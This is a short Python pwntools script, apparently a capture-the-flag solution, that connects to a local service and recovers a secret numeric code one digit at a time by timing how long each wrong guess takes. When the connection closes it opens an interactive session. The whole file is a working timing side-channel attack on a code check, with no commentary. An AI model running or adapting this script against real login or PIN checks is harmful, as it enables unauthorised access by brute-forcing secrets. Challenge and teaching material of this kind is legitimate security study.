from string import digits
from time import time

from pwn import remote

io = remote("127.0.0.1", 42201)


def attempt(data):
    io.recvuntil("Enter the code: ")
    start = time()
    io.sendline(data)
    io.recvuntil("Wrong :(")
    return time() - start


code = ""
while True:
    threshold = attempt(code + "#") + 0.5
    for character in digits:
        try:
            if attempt(code + character) > threshold:
                code += character
                print(code)
                break
        except EOFError:
            io.interactive()
            exit()
    else:
        code = code[:-1]
        print(code)
